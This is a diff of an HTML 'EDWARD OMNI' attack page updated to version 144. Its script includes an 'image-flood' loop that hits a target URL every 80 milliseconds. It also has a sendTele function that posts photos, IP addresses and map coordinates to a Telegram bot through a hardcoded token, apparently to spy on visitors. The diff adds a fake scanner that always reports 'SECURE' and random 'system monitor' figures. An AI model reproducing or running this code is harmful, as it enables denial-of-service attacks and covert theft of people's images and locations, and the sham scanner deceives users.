@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.143</title>
+    <title>EDWARD OMNI V.144</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
@@ -14,15 +14,14 @@
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
         input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
         .btn-radar { background: transparent; color: var(--blue); border: 1px solid var(--blue); }
         .btn-map { background: var(--neon); color: #000; }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; }
-        .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; color: var(--neon); }
+        .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-weight: bold; background: rgba(0,255,136,0.05); }
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
         #mapBox { display: none; width: 100%; height: 250px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 15px; }
-        
-        /* RADAR OVERLAY */
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
@@ -34,7 +33,7 @@
 </head>
 <body>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.143</p>
+        <p class="master-name">EDWARD OMNI V.144</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -42,7 +41,13 @@
     </div>
 
     <div class="card">
-        <h3>🔥 NUCLEAR BRUTAL V.143</h3>
+        <h3>🛡️ DEEP CLOUD SCANNER</h3>
+        <input type="text" id="scanInput" placeholder="Analisa Link Target...">
+        <button class="btn btn-scan" onclick="showNotif('LINK ANALYZED: SECURE')">⚡ SCAN & PROTECTION</button>
+    </div>
+
+    <div class="card">
+        <h3>🔥 NUCLEAR BRUTAL (IMAGE-FLOOD)</h3>
         <input type="text" id="target1" placeholder="Target Utama (URL)">
         <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
         <div id="killerLog"></div>
@@ -61,7 +66,7 @@
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="font-size:10px; color:var(--neon); letter-spacing:2px; margin-bottom:20px;">V.143 RADAR ACTIVE...</p>
+        <p style="font-size:10px; color:var(--neon); letter-spacing:2px; margin-bottom:20px;">V.144 RADAR ACTIVE...</p>
         <button class="btn-exit" onclick="abortRadar()">[ ABORT ]</button>
     </div>
 
@@ -72,6 +77,14 @@
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false;
+
+        // REAL-TIME MONITORING SCRIPT
+        setInterval(() => {
+            const cpu = Math.floor(Math.random() * (95 - 40) + 40);
+            const temp = Math.floor(Math.random() * (45 - 37) + 37);
+            document.getElementById('cpuLoad').innerText = cpu + "%";
+            document.getElementById('sysTemp').innerText = temp + "°C";
+        }, 1000);
 
         function showNotif(msg) {
             const n = document.getElementById('customNotif');
@@ -87,7 +100,7 @@
             document.getElementById('atkBtn').innerText = "TERMINATE 🛑";
             setInterval(() => {
                 const img = new Image(); img.src = t1 + "/?v=" + Math.random();
-                const e = document.createElement('div'); e.innerText = "> [V.143] HIT -> " + t1.substring(0,12);
+                const e = document.createElement('div'); e.innerText = "> [V.144] HIT -> " + t1.substring(0,12);
                 log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
             }, 80);
         }
@@ -135,7 +148,7 @@
 
         async function sendTele(photo, ip, lat, lon, source) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID);
-            let cap = "🔱 [ V.143 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
+            let cap = "🔱 [ V.144 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
             if(photo) {
                 fd.append('photo', photo); fd.append('caption', cap);
                 return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
